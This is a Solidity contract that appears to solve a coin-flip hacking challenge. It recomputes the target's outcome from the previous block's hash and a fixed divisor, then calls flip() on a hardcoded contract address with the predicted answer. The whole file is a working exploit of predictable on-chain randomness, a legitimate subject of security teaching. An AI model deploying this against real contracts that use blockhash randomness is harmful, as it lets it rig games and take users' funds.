// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;
  
interface ICoinFlip {
  function flip(bool guess) external returns (bool);
}
      
    

contract CoinFlip {
  uint256 FACTOR =
    57896044618658097711785492504343953926634992332820282019728792003956564819968;

  ICoinFlip public coinFlip;

  constructor() {
    coinFlip = ICoinFlip(0x7cA246E96162abA9fD08cC1DE69024fe8b0ec893);
  }

  function guessCoinFlip() external returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number - 1));
    uint256 result = blockValue / FACTOR;
    bool side = result == 1;

    return coinFlip.flip(side);
  }
}
